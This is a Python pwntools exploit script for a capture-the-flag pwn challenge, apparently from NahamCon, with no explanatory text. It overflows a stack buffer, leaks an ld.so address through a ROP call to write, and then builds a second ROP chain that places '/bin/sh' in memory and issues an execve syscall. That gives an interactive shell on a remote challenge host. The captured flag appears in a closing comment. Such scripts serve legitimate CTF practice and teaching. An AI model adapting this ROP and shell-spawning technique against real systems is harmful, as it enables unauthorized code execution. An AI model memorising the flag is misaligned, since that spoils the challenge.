#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./all_patched_up_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote('challenge.nahamcon.com', 30806)
	else:
		r = gdb.debug([exe.path])
	return r





def main():
	mov_rdi_1 = 0x0000000000401254 # mov rdi, 1; ret; 

	pop_rax_pop_rdx_pop_rbx = 0x00000000000011b2 # pop rax ; pop rdx ; pop rbx ; ret
	pop_rdi = 0x0000000000002518 # pop rdi ; ret
	pop_rsi = 0x00000000000097c8 # pop rsi ; ret
	mov_rdi_rdx = 0x000000000001d3fe # mov qword ptr [rdi], rdx ; ret
	syscall = 0x0000000000001cbe # syscall



	r = conn()

	offset = cyclic_find(0x66616166)

	payload = b''.join([
		b'A' * offset,
		p64(mov_rdi_1),
		p64(exe.symbols['write']),
		p64(exe.symbols['main']),
	])

	r.recvuntil(b'> ')
	r.sendline(payload)
	r.recv(offset)
	r.recv(152)

	ld_leak = u64(r.recv(8).ljust(8, b'\x00'))
	ld.address = ld_leak - 0x2f190
	success(f'{hex(ld.address)=}')

	pop_rax_pop_rdx_pop_rbx += ld.address
	pop_rdi += ld.address
	pop_rsi += ld.address
	mov_rdi_rdx += ld.address
	syscall += ld.address

	payload = b''.join([
		b'A' * offset,

		p64(pop_rax_pop_rdx_pop_rbx),
		p64(0),
		b'/bin/sh\x00',
		p64(0),

		p64(pop_rdi),
		p64(exe.bss(0x200)),

		p64(mov_rdi_rdx),

		p64(pop_rsi),
		p64(0),

		p64(pop_rax_pop_rdx_pop_rbx),
		p64(0x3b),
		p64(0),
		p64(0),

		p64(syscall),
	])

	r.send(payload)

	r.interactive()


if __name__ == "__main__":
	main()


# flag{499c6288c77f297f4fd87db8e442e3f0}
